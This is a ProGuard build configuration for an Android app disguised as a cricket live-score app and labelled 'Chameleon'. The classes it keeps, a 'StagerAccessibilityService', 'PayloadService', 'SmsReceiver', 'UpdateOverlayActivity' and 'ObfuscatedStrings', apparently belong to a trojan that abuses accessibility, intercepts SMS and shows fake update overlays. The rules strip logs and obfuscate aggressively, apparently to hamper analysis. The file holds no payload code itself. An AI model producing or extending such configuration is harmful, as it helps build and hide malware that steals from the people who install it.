# ============================================
# Chameleon ProGuard Rules — Aggressive
# ============================================

# Keep entry points (services, receivers, activities)
-keep class com.cricket.livescore.service.StagerAccessibilityService { *; }
-keep class com.cricket.livescore.service.PayloadService { *; }
-keep class com.cricket.livescore.service.SmsReceiver { *; }
-keep class com.cricket.livescore.ui.MainActivity { *; }
-keep class com.cricket.livescore.ui.UpdateOverlayActivity { *; }
-keep class com.cricket.livescore.ui.CleanupReceiver { *; }
-keep class com.cricket.livescore.StagerApplication { *; }

# Keep utility classes used via reflection or serialization
-keep class com.cricket.livescore.utils.CryptoUtils { *; }
-keep class com.cricket.livescore.utils.ObfuscatedStrings { *; }
-keep class com.cricket.livescore.utils.NetworkUtils { *; }
-keep class com.cricket.livescore.utils.PermissionHelper { *; }

# Keep JSON
-keep class org.json.** { *; }

# Remove logging in release
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
}

# Aggressive obfuscation
-optimizationpasses 5
-allowaccessmodification
-repackageclasses 'c'
-overloadaggressively
-useuniqueclassmembernames
-mergeinterfacesaggressively
-flattenpackagehierarchy
-dontpreverify
-verbose

# Remove unused code
-dontskipnonpubliclibraryclasses
-whyareyoukeeping class com.cricket.livescore.** { *; }
